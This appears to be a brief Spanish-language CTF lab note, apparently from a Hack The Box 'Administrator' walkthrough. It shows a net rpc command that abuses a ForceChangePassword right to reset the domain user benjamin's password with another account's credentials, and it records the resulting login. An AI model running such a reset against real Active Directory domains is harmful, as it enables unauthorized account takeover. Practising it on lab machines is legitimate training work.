#forcechangepassword

---

![[Administrator31.png]]

```shell
net rpc password "benjamin" "pawned1234" -U "administrator.htb"/"Michael"%"pawned123" -S "10.129.112.167"
```
Si ponia michael con minuscula no me agarraba
![[Administrator30.png]]
Las credenciales son benjamin:pawned1234

Y asi cambiamos la contraseña del usuario *benjamin*